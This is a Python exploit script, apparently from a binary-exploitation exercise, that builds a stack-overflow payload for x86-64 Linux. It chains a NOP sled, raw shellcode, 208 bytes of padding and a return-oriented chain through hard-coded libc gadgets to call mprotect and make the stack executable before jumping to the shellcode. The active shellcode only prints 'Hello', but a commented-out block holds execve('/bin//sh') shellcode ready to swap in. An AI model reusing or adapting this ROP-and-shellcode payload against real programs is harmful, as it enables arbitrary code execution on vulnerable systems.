import sys
from struct import pack
base_libc = 0x007ffff7de0000
base_stak = 0x007ffffffde000
addr      = lambda x:pack("<Q",x)
base      = lambda x:base_libc+x
nops      = b"\x90"*40
#shell     = b"\x48\x31\xf6\x56\x48\xbf\x2f"
#shell    += b"\x62\x69\x6e\x2f\x2f\x73\x68"
#shell    += b"\x57\x54\x5f\x6a\x3b\x58\x99"
#shell    += b"\x0f\x05"
shell     = b"\xb8\x01\x00\x00\x00\x48\xbe"
shell    += b"\x48\x65\x6c\x6c\x6f\x00\x00"
shell    += b"\x00\x56\x48\x89\xe6\xba\x05"
shell    += b"\x00\x00\x00\x0f\x05\xb8\x3c"
shell    += b"\x00\x00\x00\x0f\x05\x66\x2e"
shell    += b"\x0f\x1f\x84\x00\x00\x00\x00"
shell    += b"\x00\x0f\x1f\x44\x00\x00";
padding   = b"A"*(208-(len(shell)+len(nops)))
padding  += b"B"*8
pop_rdi   = 0x0000000000026796
pop_rsi   = 0x000000000002890f
pop_rdx   = 0x00000000000cb1cd
mode      = 0x07
lenght    = 0x101010
mprotect  = 0x7ffff7ed8c20
rip       = 0x7fffffffdd9c
ret       = 0x00000000000a7d3b
exploit   = nops
exploit  += shell
exploit  += padding
exploit  += addr(base(ret))
exploit  += addr(base(pop_rdi))
exploit  += addr(base_stak)
exploit  += addr(base(pop_rsi))
exploit  += addr(lenght)
exploit  += addr(base(pop_rdx))
exploit  += addr(mode)
exploit  += addr(mprotect)
exploit  += addr(rip)
sys.stdout.buffer.write(exploit)